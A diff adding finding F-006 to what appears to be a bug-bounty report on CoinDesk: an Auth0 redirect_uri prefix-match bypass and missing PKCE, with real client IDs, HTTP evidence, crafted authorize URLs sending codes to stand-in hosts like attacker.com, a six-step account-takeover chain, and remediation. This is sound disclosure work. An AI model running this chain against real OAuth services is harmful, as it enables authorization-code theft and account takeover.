@@ -328,17 +328,148 @@ The following were identified but not tested (out-of-scope per program rules):
 
 ---
 
+## F-006: Auth0 redirect_uri Prefix Match Bypass + PKCE Not Enforced
+
+**Severity:** MEDIUM — P3 (escalates to HIGH/P2 if open redirect confirmed on trade.coindesk.com)  
+**Targets:**  
+- Production: `auth.coindesk.com`, client `eNCm4Q6PI4nKRF8jUuoOGHGVDJGsX8kt` (trade.coindesk.com)  
+- Staging: `staging.auth.coindesk.com`, client `HdXIA4sBorg8INLWJLJQdmac5YUodK1f` (trade-simnext.coindesk.com)  
+**Category:** OAuth 2.0 Misconfiguration — redirect_uri Validation Bypass + Missing PKCE Enforcement  
+**CVSS:** 6.1 (Medium) standalone — 8.0 (High) with open redirect
+
+### Description
+
+**Issue 1 — redirect_uri Prefix Match (not Exact Match):**
+
+Auth0 validates `redirect_uri` by prefix only, comparing scheme + host + path. It does NOT validate query parameters. An attacker can inject arbitrary query parameters into any registered callback URL:
+
+```
+BLOCKED (extra path segment):
+redirect_uri=https://trade.coindesk.com/evil          → HTTP 403
+
+ALLOWED (query params injected — prefix match):
+redirect_uri=https://trade.coindesk.com/              → HTTP 302 (valid baseline)
+redirect_uri=https://trade.coindesk.com/?x=https://evil.com → HTTP 302 (BYPASSES validation)
+redirect_uri=https://trade.coindesk.com/?next=https://attacker.com → HTTP 302 (BYPASSES validation)
+```
+
+After a victim authenticates, Auth0 redirects to:
+```
+https://trade.coindesk.com/?next=https://attacker.com&code=XXXXXX&state=YYYYY
+```
+
+The authorization code is now delivered to a URL partially under attacker influence. If `trade.coindesk.com` performs a client-side redirect based on the `?next=` parameter (open redirect), the auth code leaks to the attacker's server.
+
+**Issue 2 — PKCE Not Enforced for Public Client:**
+
+Auth0's OIDC discovery document (`/.well-known/openid-configuration`) does not include `require_pkce`. The production SPA client accepts authorization requests without a `code_challenge` parameter:
+
+```
+# Request without PKCE (no code_challenge):
+GET /authorize?client_id=eNCm4Q6PI4nKRF8jUuoOGHGVDJGsX8kt&redirect_uri=...&response_type=code&scope=openid
+→ HTTP 302 (authorization proceeds — PKCE not required)
+```
+
+For public OAuth clients (SPAs with no client secret), PKCE is the only mechanism binding an authorization code to the initiating party. Without PKCE enforcement, any intercepted auth code can be exchanged for access tokens without the original code verifier.
+
+This violates [RFC 9700 Section 2.1](https://www.rfc-editor.org/rfc/rfc9700) (OAuth 2.0 Security Best Current Practice) and Auth0's own security recommendations.
+
+**Issue 3 — Both Registered Callbacks Vulnerable:**
+
+The prefix match affects all registered redirect URIs, including:
+- `https://trade.coindesk.com/` (primary callback)
+- `https://trade-simnext.coindesk.com/social/auth/callback` (social login callback — confirmed registered)
+
+### Evidence
+
+**Prefix Match — Production Auth0:**
+```http
+GET /authorize?client_id=eNCm4Q6PI4nKRF8jUuoOGHGVDJGsX8kt
+    &redirect_uri=https://trade.coindesk.com/?next=https://evil.com
+    &response_type=code&scope=openid
+Host: auth.coindesk.com
+X-Bug-Bounty: bugcrowd
+
+HTTP/2 302
+location: /u/login/identifier?state=hKFo2SB...  ← login proceeds normally
+```
+
+**Blocked (extra path segment):**
+```http
+redirect_uri=https://trade.coindesk.com/evil → HTTP 403
+redirect_uri=https://evil.com               → HTTP 403
+```
+
+**PKCE Not Enforced — Production Auth0:**
+```http
+GET /authorize?client_id=eNCm4Q6PI4nKRF8jUuoOGHGVDJGsX8kt
+    &redirect_uri=https://trade.coindesk.com/
+    &response_type=code&scope=openid
+    # NOTE: No code_challenge / code_challenge_method
+Host: auth.coindesk.com
+
+HTTP/2 302
+location: /u/login/identifier?state=hKFo2SB...  ← authorized without PKCE
+```
+
+**Staging Auth0 — Same behavior confirmed:**
+```
+staging.auth.coindesk.com + client HdXIA4sBorg8INLWJLJQdmac5YUodK1f:
+  redirect_uri=https://trade-simnext.coindesk.com/ → HTTP 302 ✓
+  redirect_uri=https://trade-simnext.coindesk.com/?x=evil → HTTP 302 ✓ (prefix match bypass)
+  redirect_uri=https://trade-simnext.coindesk.com/evil → HTTP 403
+```
+
+### Attack Chain (requires open redirect on trade.coindesk.com)
+
+1. Attacker crafts authorization URL:
+   ```
+   https://auth.coindesk.com/authorize?
+     client_id=eNCm4Q6PI4nKRF8jUuoOGHGVDJGsX8kt&
+     redirect_uri=https://trade.coindesk.com/?next=https://attacker.com&
+     response_type=code&scope=openid
+   ```
+2. Victim clicks link, authenticates with CoinDesk credentials
+3. Auth0 redirects to: `https://trade.coindesk.com/?next=https://attacker.com&code=XXXXXX&state=YYYYY`
+4. If `trade.coindesk.com` redirects based on `?next=`, victim is sent to `https://attacker.com?code=XXXXXX`
+5. Attacker exchanges code (no PKCE verifier needed — Issue 2) for access + refresh tokens
+6. Attacker has full authenticated session as victim
+
+**Status:** Open redirect on `trade.coindesk.com` not confirmed (geo-blocked from testing environment). Attack chain is plausible but requires verification.
+
+### Impact
+
+- **Auth Code Theft**: Stolen authorization code redeemable for access and refresh tokens (no PKCE = no binding)
+- **Account Takeover**: Full access to victim's CoinDesk trading account (trade.coindesk.com is a regulated cryptocurrency exchange)
+- **Persistence**: If offline_access scope is granted, attacker obtains refresh tokens for long-term access
+- **Affects Both Environments**: Production and staging OAuth flows both misconfigured
+
+### Remediation
+
+1. **Fix redirect_uri validation**: Auth0 should validate the FULL redirect_uri (scheme + host + path + query string). Enable "Exact Match" validation in Auth0 application settings.
+2. **Enforce PKCE**: In the Auth0 application settings for client `eNCm4Q6PI4nKRF8jUuoOGHGVDJGsX8kt`, enable **"Require PKCE"** for the Authorization Code flow. This prevents code reuse even if intercepted.
+3. **Apply to staging**: Apply same fixes to `staging.auth.coindesk.com` for client `HdXIA4sBorg8INLWJLJQdmac5YUodK1f`.
+4. **Audit registered callbacks**: Review all registered redirect_uri values for the Trade application and remove any that are no longer in use.
+
+---
+
 ## Conclusion
 
 The highest-impact confirmed finding is **F-001** (`go.coindesk.com` Bitly subdomain takeover, HIGH/P2) which qualifies for Bugcrowd's subdomain takeover category. When chained with **F-005** (CORS misconfiguration on `cdm.coindesk.com`), the combined impact escalates to HIGH — an attacker controlling `go.coindesk.com` gains a CORS-trusted origin capable of reading credentialed responses from `cdm.coindesk.com`.
 
+**F-006** (Auth0 redirect_uri prefix match + missing PKCE enforcement) affects both production and staging OAuth. The prefix match allows an attacker to inject arbitrary query parameters into the registered callback URL, and the missing PKCE enforcement means any intercepted authorization code is immediately redeemable for tokens without the original initiator's code verifier.
+
 The Sailthru CNAMEs in **F-002** require manual verification from a non-proxied network before submission.
 
 **Priority submissions:**
-1. F-001 + F-005 (chained) — go.coindesk.com takeover as CORS-trusted attack origin
-2. F-001 standalone — subdomain takeover for phishing/malware distribution
-3. F-002 — Sailthru CNAME verification (manual check needed)
+1. F-001 + F-005 (chained) — go.coindesk.com takeover as CORS-trusted attack origin (HIGH/P2)
+2. F-006 — Auth0 prefix match bypass + PKCE not enforced on trade.coindesk.com (MEDIUM/P3, escalates to HIGH with open redirect)
+3. F-001 standalone — subdomain takeover for phishing/malware distribution (HIGH/P2)
+4. F-002 — Sailthru CNAME verification (manual check needed, MEDIUM/P3)
+5. F-005 standalone — CORS wildcard misconfiguration on cdm.coindesk.com (MEDIUM/P3)
 
-**Recommended immediate action:** Remove or reclaim `go.coindesk.com` DNS record AND fix CORS policy on `cdm.coindesk.com` to use an explicit origin allowlist.
+**Recommended immediate action:**
+1. Remove or reclaim `go.coindesk.com` DNS record AND fix CORS policy on `cdm.coindesk.com`
+2. Enable PKCE requirement and fix redirect_uri exact-match validation on `auth.coindesk.com`
 
 **Status:** Active — testing ongoing.
